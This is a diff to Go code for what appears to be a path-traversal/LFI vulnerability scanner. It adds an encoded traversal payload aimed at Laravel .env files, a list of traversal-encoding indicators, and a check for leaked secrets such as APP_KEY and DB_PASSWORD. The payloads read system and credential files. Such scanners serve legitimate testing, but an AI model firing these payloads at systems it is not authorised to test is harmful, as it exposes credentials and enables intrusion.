@@ -49,6 +49,7 @@ var LFIPayloads = []TraversalPayload{
 
 	// --- DOUBLE ENCODED (BUG BOUNTY TIP) ---
 	{"LFI Double Encoded Dots", "%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd", "root:x:", "linux"},
+	{"LFI Encoded Traversal via index.php (.env)", "index.php/%2e%2e/%2e%2e/.env", "APP_KEY=", "all"},
 	{"LFI Double Encoded Dots (Laravel/.env)", "%2e%2e/%2e%2e/%2e%2e/.env", "APP_KEY=", "all"},
 
 	// --- Wrappers & Protocols ---
@@ -208,9 +209,13 @@ func checkLFIVector(target string, payload TraversalPayload, client *http.Client
 		return
 	}
 
-	isTraversal := strings.Contains(payload.Payload, "..") || strings.Contains(payload.Payload, "://")
+	isTraversal := isTraversalPayload(payload.Payload)
 
 	if strings.Contains(bodyStr, payload.Check) {
+		if payload.Check == "APP_KEY=" && !looksLikeEnvLeak(bodyStr) {
+			return
+		}
+
 		// Weak indicator often appears in normal web content.
 		if payload.Check == "127.0.0.1" {
 			hostsRe := regexp.MustCompile(`(?mi)^127\.0\.0\.1\s+localhost`)
@@ -265,14 +270,63 @@ func checkLFIVector(target string, payload TraversalPayload, client *http.Client
 		}
 
 		// Standard LFI Logic
-		if isTraversal || strings.HasPrefix(payload.Payload, "/etc/") {
+		if isTraversal || strings.HasPrefix(payload.Payload, "/etc/") || payload.Check == "APP_KEY=" {
 			if strings.Contains(bodyLower, "<html") && payload.Check != "root:x:" && payload.Check != "OPENSSH PRIVATE KEY" && payload.Check != "[fonts]" {
 				return
 			}
 			mu.Lock()
-			*results = append(*results, fmt.Sprintf("System File Read (%s) - Found: %s", payload.Name, payload.Check))
+			if payload.Check == "APP_KEY=" {
+				*results = append(*results, fmt.Sprintf("Sensitive Information Disclosure (Path Traversal) (%s) - Leaked .env markers: APP_KEY + DB/APP config", payload.Name))
+			} else {
+				*results = append(*results, fmt.Sprintf("System File Read (%s) - Found: %s", payload.Name, payload.Check))
+			}
 			*highestSeverity = "Critical"
 			mu.Unlock()
 		}
 	}
+}
+
+func isTraversalPayload(payload string) bool {
+	p := strings.ToLower(payload)
+	indicators := []string{
+		"..",
+		"%2e%2e",
+		"%252e%252e",
+		"%u002e%u002e",
+		"%c0%ae",
+		"..;",
+		"‥/",
+		"︰/",
+		"／",
+		"://",
+	}
+	for _, s := range indicators {
+		if strings.Contains(p, s) {
+			return true
+		}
+	}
+	return false
+}
+
+func looksLikeEnvLeak(body string) bool {
+	lower := strings.ToLower(body)
+	if !strings.Contains(lower, "app_key=") {
+		return false
+	}
+
+	secondary := []string{
+		"app_env=",
+		"db_host=",
+		"db_database=",
+		"db_username=",
+		"db_password=",
+		"mail_host=",
+		"redis_host=",
+	}
+	for _, m := range secondary {
+		if strings.Contains(lower, m) {
+			return true
+		}
+	}
+	return false
 }
